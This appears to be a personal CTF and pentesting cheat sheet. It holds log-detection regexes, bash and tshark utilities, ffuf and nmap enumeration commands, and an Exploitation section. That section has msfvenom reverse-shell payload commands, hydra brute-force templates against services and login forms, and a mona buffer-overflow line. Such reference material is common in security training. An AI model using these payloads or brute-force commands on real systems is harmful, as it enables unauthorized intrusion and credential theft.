Sublime Regex Baby

Find IP Addresses

\b(?:\d{1,3}\.){3}\d{1,3}\b

Find Flags Between { }

(?<=\{)(.*?)(?=\})

Find Lines with Substring

.*\.com.*

Detecting Open Redirect Attacks

/^.*"GET.*\?.*=(https%3a%2f%2f[a-z0-9-]+%2e[a-z]{2,}).+?.*HTTP\/.*".*$/gm

Detecting Directory Traversal Attacks (nginx)

/^.*"GET.*\?.*=(%2e%2e%2f).+?.*HTTP\/.*".*$/gm

/^.*"GET.*\?.*=(.+?(?=%2e%2e%2fetc%2f)).+?.*HTTP\/.*".*$/gm

Regex to Detect Failed Logins (nginx)

/^(\S+) \S+ \S+ \[.*?\] "(POST|GET) \/login\.php.*?" (401|403) \d+ ".*?" ".*?"/gm

Detecting !DOCTYPE Regex

^(\S+) - (\S+) \[(.*?)\] "(\S+) (.*?)\?(?=.*?\b21DOCTYPE\b).*? HTTP\/\d\.\d" (\d+) (\d+) "(.*?)" "(.*?)"

Select Lines That Doesn’t Include Substring

^(?!.*<STRING>).+$

Smash Bash

Base64 Decode a File

while IFS= read -r line; do echo "$line" | base64 --decode; done < file

Downloading Recursively with wget

wget --recursive --no-parent <WEBSITESITE>

Downloading a Directory with wget

wget -r -np -nH --cut-dirs=3 -R index.html <DIRECTORY>

yt-dlp (Downloading the best quality from a file)

yt-dlp  --merge-output-format mp4 -f "bestvideo+bestaudio[ext=m4a]/best" -a likes.txt

Examining .DS_Store

xxd -p <path/to/.DS_Store> | sed 's/00//g' | tr -d '\\n' | sed 's/\\([0-9A-F]\\{2\\}\\)/0x\\1 /g' | xxd -r -p | strings | sed 's/ptb[LN]ustr//g'

Replacing String with sed

sed 's/<TARGET_STRING>/<REPLACE_STRING>/g' <FILE>

Removing Newline Characters

tr -d "\n\r" < <FILE>

Recursively Unzip

#!/bin/bash

# There is always a format, identify it 
format=2023

while true
do
	# If it's a tar file use this 
  # tar -xvf file$format.tar
	unzip file$format.zip
  
	# To decrease or increase  
	let "format-=1"
done

Concatenating All Files Based on Type

find . -name '*.<FILE_TYPE>' -exec cat {} +

Networking

Extracting DNS records with tshark

tshark -r <PACKET_FILE> -Tfields -e dns.qry.name -Y "ip.src_host==<IP_ADDRESS>" > <TXT_FILE>

Extracting Destination Ports Based on Source Port

tshark -r <PACKET_FILE> -Y "<PROTOCOL>.srcport == <PORT>" -T fields -e <PROTOCOL>.dstport > ports.txt

Enumeration

Recursive Directory Scanning with ffuf

ffuf -w <WORDLIST> -u http://<IP_ADDRESS>/FUZZ -o <OUTPUT_FILE> --recursion -fc 403

Basic Network Scanning with nmap

nmap -sC -sV --oN <OUTPUT_FILE> -vv -Pn <IP_ADDRESS>

Exploitation

msfvenom (Simple Windows Payload)

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP_ADDRESS> LPORT=<LISTENING_PORT> -f exe -e x86/shikata_ga_nai -o <OUTPUT_FILE>

msfvenom (Simple Windows Payload Shell)

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f py -b [bad characters]

Brute Forcing

Service Brute Forcing with hydra

hydra -v -l <USERNAME> -P <PASSWORD> -s <PORT> -f <IP_ADDRESS> <SERVICE> -V

Brute Forcing Forms with http-post-form

hydra -t 4 -V -l <USERNAME> -P <PASSWORD_LIST> <IP_ADDRESS> http-post-form "<DIRECTORY>:<RAW_POST_REQUEST>:<ERROR_MESSAGE>"

Brute Forcing Pop Up Login Page with hydra

hydra -l usernames.txt -P <PASSWORD> <IP_ADDRESS> http-get / -V

!mona jmp -r esp -cpb [bad characters]
